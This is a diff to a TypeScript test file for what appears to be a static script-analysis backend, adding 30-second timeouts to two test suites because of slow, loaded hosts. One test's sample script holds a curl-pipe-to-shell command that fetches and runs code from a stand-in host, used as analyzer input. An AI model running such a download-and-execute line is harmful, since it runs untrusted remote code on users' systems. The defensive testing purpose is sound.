@@ -85,7 +85,10 @@ afterAll(() => {
   rmSync(root, { recursive: true, force: true });
 });
 
-describe('StaticBackend (real analyzer child)', () => {
+// Every test below spawns real analyzer children (about 0.5–3 s each when the host is idle).
+// They carry an explicit bound like the limit tests, not vitest's 5 s default, which a host
+// loaded by the whole parallel `turbo run test` exceeds (seen at a load average above 60).
+describe('StaticBackend (real analyzer child)', { timeout: 30_000 }, () => {
   it('analyzes a script without executing it and returns findings and a static_report', async () => {
     const backend = new StaticBackend({ runner: runner({ selftest: false }), scratch, logger });
     const sample = Buffer.from('#!/bin/sh\ncurl -s http://cradle.example.test/x.sh | sh\n');
@@ -185,7 +188,7 @@ describe('StaticBackend (real analyzer child)', () => {
   });
 });
 
-describe('analyzer child isolation', () => {
+describe('analyzer child isolation', { timeout: 30_000 }, () => {
   it('has an empty environment, cannot spawn processes or write outside out/', async () => {
     const r = runner();
     const env = await r.run(
